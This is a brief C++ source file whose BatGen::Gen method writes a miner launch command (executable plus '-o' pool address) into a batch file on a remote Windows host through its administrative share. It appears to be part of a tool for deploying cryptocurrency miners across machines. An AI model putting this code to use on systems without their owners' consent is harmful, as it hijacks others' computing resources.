#include "BatGen.h"

#include <fstream>

BatGen::BatGen()
{

}

BatGen::~BatGen()
{

}

bool BatGen::Gen(const binHosts& mHost, const std::string& sPool)
{
	bool bRes=true;
	std::string sContent=mHost.sMiner+" -o "+sPool;
	std::string sPath=mHost.sPath;
	sPath[1]='$';
	std::string sBatPath="\\\\"+mHost.sHost+"\\"+sPath+"\\"+mHost.sExec;

	std::ofstream ofs;
	ofs.open(sBatPath, std::ios::out);
	if (ofs.is_open())
	{
		ofs<<sContent;
		ofs.close();
	}
	else
		bRes=false;

	return bRes;
}